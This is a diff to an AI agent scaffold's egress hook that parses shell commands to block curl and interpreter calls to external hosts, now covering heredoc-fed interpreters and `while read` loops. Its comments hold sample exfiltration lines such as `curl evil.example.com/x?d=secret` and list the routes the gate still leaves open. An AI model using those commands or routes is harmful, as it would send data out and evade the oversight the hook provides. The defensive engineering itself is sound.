@@ -5,12 +5,19 @@
 // The deny list (agent-scaffold.ts, BASH_EGRESS_DENY) matches COMMAND NAMES with globs and has no
 // negation, so it cannot say "any http EXCEPT localhost". Its own comment names what passes:
 // plain-http external fetches, interpreter one-liners (python3 -c, node -e), and a URL hidden in a
-// shell variable. This hook closes exactly those three shapes by PARSING the command:
+// shell variable. This hook closes those three shapes, plus the heredoc-fed interpreter, by PARSING
+// the command:
 //   1. curl to an EXTERNAL destination: a scheme-bearing URL (http:// included, which the deny list
 //      cannot cover), and any positional / --url / proxy argument even WITHOUT a scheme;
 //   2. an interpreter one-liner (python/node/perl/ruby/php/deno/bun with -c/-e/-r/--eval) whose code
 //      carries an EXTERNAL URL;
-//   3. either of the above when the URL sits in a variable ASSIGNED IN THE SAME COMMAND.
+//   3. either of the above when the URL sits in a variable ASSIGNED IN THE SAME COMMAND. A `for`
+//      loop word list and the stdin of a `while read` loop (here-string or heredoc) count as such
+//      assignments: `for u in URL; do curl "$u"` and `while read u; do curl "$u"; done <<< URL`;
+//   4. (EGRESSHEREDOC924, owner GO 2026-10-02) a heredoc / here-string that IS an interpreter's
+//      program (`python3 - <<'PY'`, `node <<EOF`, `perl <<-X`, `python3 <<< "..."`): its body is
+//      judged exactly like a -c / -e body (2.). For a shell (bash/sh/zsh/dash/ksh) the body gets the
+//      whole analysis, as if it were the command itself (`bash <<EOF` with a curl inside).
 // localhost / 127.0.0.1 / [::1] ALWAYS pass: the dashboard's own calls (memory, kanban, message
 // queue, approvals) go over http://localhost and a gate that cut them would silence the fleet.
 // Hosts are cut with a regex, not URL(), so http://localhost:$PORT stays local, while
@@ -29,14 +36,19 @@
 //
 // HOW IT READS THE COMMAND: structure from the MASKED text (maskInertLiterals blanks quoted strings
 // and heredoc bodies, length-preserving), so a `curl` or `;` inside a quoted argument or a heredoc
-// is not a command; the URL from the ORIGINAL text of the same span.
+// is not a command; the URL from the ORIGINAL text of the same span. A heredoc body is read only
+// where it is stdin to an interpreter or a `read` loop (4. and 3.); to anything else (`cat <<EOF`,
+// `curl --data-binary @- <<'JSON'`) it stays inert text.
 //
 // WHAT THIS DOES NOT CLOSE -- said here so nobody reads "merged" as "closed" (owner/Marveen 29047):
 // the name-and-shape list will never be complete. Still open after (a): network calls INSIDE a script
-// file (`bash x.sh`, `python3 x.py` -- the hook sees only the outer command); heredoc-fed interpreters
-// (`python3 - <<'PY'`, `bash <<EOF`); a URL whose host is not literally in the command (read from a
-// file, the environment, a previous command, a curl -K config, or computed by a substitution such as
-// `curl $(echo https://x)`); every other network-capable binary (git, pip, npm, ssh, scp, rsync, dig ...).
+// file (`bash x.sh`, `python3 x.py` -- the hook sees only the outer command); a program PIPED into
+// an interpreter (`cat <<EOF | python3 -`, `echo "..." | bash`: only a heredoc / here-string on the
+// interpreter itself is read); a URL whose host is not literally in the command (read from a file,
+// `while read u; ... done < urls.txt`, the environment, a previous command, a curl -K config, or
+// computed by a substitution such as `curl $(echo https://x)`); every other network-capable binary
+// (git, pip, npm, ssh, scp, rsync, dig ...). An interpreter body that reaches the network without a
+// NET_PRIMITIVE name (subprocess + curl, a browser driver) passes here exactly as in a one-liner.
 // Closing those is direction (b): an allowlist / network-level gate, not this hook.
 //
 // Fail-open on unparseable input or an internal error (logged): a crashed gate must not silence the
@@ -215,7 +227,9 @@ function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
   return Math.min(j + 1, text.length)
 }
 export function liftSubstitutions(text) {
-  const inners = []; let out = ''; let i = 0
+  // herestrings: offsets of every LIVE `<<<` operator (blanked in `stripped`, so the caller cannot
+  // find them there any more). A `<<<` inside quotes or a heredoc body is text and is not listed.
+  const inners = []; const herestrings = []; let out = ''; let i = 0
   // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
   const lift = (at) => {
     if (text[at] === '$' && text[at + 1] === '(') {
@@ -248,7 +262,7 @@ export function liftSubstitutions(text) {
     // A here-string (<<<) is not a heredoc, but maskInertLiterals reads `<<<"$s"` as a heredoc
     // tagged `$s` with no body and gives up. The operator carries no URL and no command: blank it,
     // and the word after it is parsed as ordinary (quoted or live) text.
-    if (text.startsWith('<<<', i)) { out += '   '; i += 3; continue }
+    if (text.startsWith('<<<', i)) { herestrings.push(i); out += '   '; i += 3; continue }
     const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(text.slice(i))
     if (here) {
       const tag = here[1] ?? here[2] ?? here[3]
@@ -259,7 +273,8 @@ export function liftSubstitutions(text) {
       // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
       // by processing it recursively, then continue with the body
       const lineRest = liftSubstitutions(text.slice(i, nl + 1))
-      out += lineRest.stripped; inners.push(...lineRest.inners); i = nl + 1
+      out += lineRest.stripped; inners.push(...lineRest.inners)
+      herestrings.push(...lineRest.herestrings.map((p) => p + i)); i = nl + 1
       const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
       const rel = endRx.exec(text.slice(i))
       const bodyEnd = rel ? i + rel.index : text.length
@@ -294,7 +309,7 @@ export function liftSubstitutions(text) {
     if (n !== -1) { i = n; continue }
     out += c; i++
   }
-  return { stripped: out, inners }
+  return { stripped: out, inners, herestrings }
 }
 // curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
 // curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
@@ -393,9 +408,104 @@ export function curlDestinations(args) {
   }
   return dests.filter((h) => !isLocalHost(h))
 }
+// EGRESSHEREDOC924: STDIN FEEDS. A heredoc body or a here-string word is what the command on the
+// left reads from stdin. For an interpreter that stdin IS the program (`python3 - <<'PY'`,
+// `node <<EOF`, `bash <<< 'curl ...'`), and for a `while read u` loop it is the list of values `u`
+// takes. maskInertLiterals blanks both (rightly: to the OUTER shell they are text), so before this
+// neither reading was ever judged.
+const SHELL = /^(?:bash|sh|zsh|dash|ksh)$/
+// `read` options that take a value; -a's value is itself a variable name (an array).
+const READ_OPT_WITH_VALUE = new Set('adnNptui'.split(''))
+// The word after `<<<`, raw (quotes kept), ending at unquoted whitespace or a shell operator.
+function hereStringWord(text, i) {
+  while (i < text.length && (text[i] === ' ' || text[i] === '\t')) i++
+  const s = i
+  while (i < text.length && !/[\s;&|<>()]/.test(text[i])) {
+    if (text[i] === "'") { const e = text.indexOf("'", i + 1); i = e === -1 ? text.length : e + 1; continue }
+    if (text[i] === '"' || (text[i] === '$' && text[i + 1] === "'")) {
+      const q = text[i] === '"' ? '"' : "'"; let j = text[i] === '"' ? i + 1 : i + 2
+      while (j < text.length && text[j] !== q) j += text[j] === '\\' ? 2 : 1
+      i = j + 1; continue
+    }
+    i += text[i] === '\\' ? 2 : 1
+  }
+  return text.slice(s, Math.min(i, text.length))
+}
+// Every feed: { at, text, expands }. `at` is the operator offset (it decides which sub-command the
+// feed belongs to); `expands` is whether the shell expands $VARS in it (unquoted heredoc tag, a
+// here-string word that is not single-quoted).
+function stdinFeeds(orig, masked, herestrings, env) {
+  const feeds = []
+  // Heredoc operators are found in the MASKED text, so one inside quotes or another body is not one.
+  for (const m of masked.matchAll(/<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/g)) {
+    const tag = m[1] ?? m[2] ?? m[3]
+    const nl = orig.indexOf('\n', m.index + m[0].length)
+    if (nl === -1) continue
+    const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
+    const rel = endRx.exec(orig.slice(nl + 1))
+    feeds.push({ at: m.index, text: orig.slice(nl + 1, rel ? nl + 1 + rel.index : orig.length), expands: m[3] != null })
+  }
+  for (const at of herestrings) {
+    const raw = hereStringWord(orig, at + 3)
+    if (!raw) continue
+    const expands = !raw.startsWith("'")
+    feeds.push({ at, text: shellWords(expands ? expand(raw, env) : raw).join(' '), expands: false })
+  }
+  return feeds
+}
+// The command word of the sub-command that contains offset `at` (basename, prefixes skipped).
+function commandWordAt(masked, at) {
+  for (const [a, b] of spans(masked)) {
+    if (at < a || at > b) continue
+    const mw = words(masked.slice(a, b))
+    let i = 0
+    while (i < mw.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(mw[i]) || PREFIX_WORDS.has(mw[i]))) i++
+    return i < mw.length ? mw[i].split('/').pop() : null
+  }
+  return null
+}
+// Every `read` in the command, as { names, array }: `while IFS= read -r a b` -> names [a, b];
+// `read -a arr` -> array arr; a bare `read` -> names [REPLY].
+function collectReads(orig, masked) {
+  const reads = []
+  for (const [a, b] of spans(masked)) {
+    const sw = shellWords(orig.slice(a, b))
+    let k = 0
+    while (k < sw.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(sw[k]) || PREFIX_WORDS.has(sw[k]) || sw[k] === 'while' || sw[k] === 'until')) k++
+    if (sw[k] !== 'read') continue
+    const names = []; let array = null
+    for (k++; k < sw.length; k++) {
+      const w = sw[k]
+      if (w.startsWith('-') && w.length > 1) {
+        for (let q = 1; q < w.length; q++) {
+          if (!READ_OPT_WITH_VALUE.has(w[q])) continue
+          const v = q + 1 < w.length ? w.slice(q + 1) : sw[++k]
+          if (w[q] === 'a' && /^[A-Za-z_]\w*$/.test(v ?? '')) array = v
+          break
+        }
+        continue
+      }
+      if (/^[A-Za-z_]\w*$/.test(w)) names.push(w); else break
+    }
+    reads.push({ names: names.length || array ? names : ['REPLY'], array })
+  }
+  return reads
+}
+// The values one `read` gives its variables from a fed text, line by line, the way read splits a
+// line: field k to the k-th name, the rest of the line to the last name, every field to an array.
+function readValues(text, { names, array }) {
+  const out = {}
+  const add = (v, x) => { if (x) (out[v] ??= []).push(x) }
+  for (const line of text.split('\n')) {
+    const f = line.trim().split(/\s+/).filter(Boolean)
+    names.forEach((v, k) => add(v, k < names.length - 1 ? f[k] : f.slice(k).join(' ')))
+    if (array) for (const x of f) add(array, x)
+  }
+  return out
+}
 export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set()) {
   const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
-  const { stripped: orig, inners } = liftSubstitutions(norm)
+  const { stripped: orig, inners, herestrings } = liftSubstitutions(norm)
   if (depth < 4) {
     for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
   }
@@ -403,6 +513,39 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
   if (masked === null || masked.length !== orig.length) return { deny: false, reason: 'unparseable', hosts: [] }
   const env = collectAssignments(orig, masked)
   const loops = collectLoops(orig, masked, env)
+  const feeds = stdinFeeds(orig, masked, herestrings, env)
+  // A `while read u; do ...; done <<< "URL"` (or `<<EOF` body, or `read u <<< "URL"`) binds u to
+  // the fed lines in the same command, exactly like `for u in URL`: the values join the loop values.
+  const reads = collectReads(orig, masked)
+  for (const f of reads.length ? feeds : []) {
+    const c = commandWordAt(masked, f.at)
+    if (c !== 'done' && c !== 'read') continue
+    const text = f.expands ? expand(f.text, env) : f.text
+    for (const r of reads) for (const [v, vals] of Object.entries(readValues(text, r))) loops[v] = [...(loops[v] ?? []), ...vals]
+  }
+  // A heredoc / here-string that IS the program of an interpreter is judged like a -c / -e body: the
+  // same NET_PRIMITIVE test, the same URL_RE scan, the same local / private / vendor exceptions. A
+  // shell interpreter's body is a command line of its own, so it gets the whole analysis.
+  for (const f of feeds) {
+    const cmd = commandWordAt(masked, f.at)
+    const shell = cmd !== null && SHELL.test(cmd)
+    if (!shell && !(cmd !== null && INTERPRETER.test(cmd))) continue
+    const plain = f.expands ? expand(f.text, env) : f.text
+    const variants = f.expands ? loopVariants(f.text, env, loops) : []
+    for (const text of [plain, ...(variants ?? [])]) {
+      if (shell) {
+        if (depth >= 4) break
+        const r = classify(text, depth + 1, vendorHosts, vendorDomains)
+        if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
+        continue
+      }
+      if (!NET_PRIMITIVE.test(text)) continue
+      const found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
+      const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
+      if (hosts.length) return { deny: true, reason: 'heredoc-external', hosts }
+    }
+    if (variants === null) return { deny: true, reason: 'heredoc-loop-unbounded', hosts: [] }
+  }
   for (const [a, b] of spans(masked)) {
     const mw = words(masked.slice(a, b))
     let i = 0
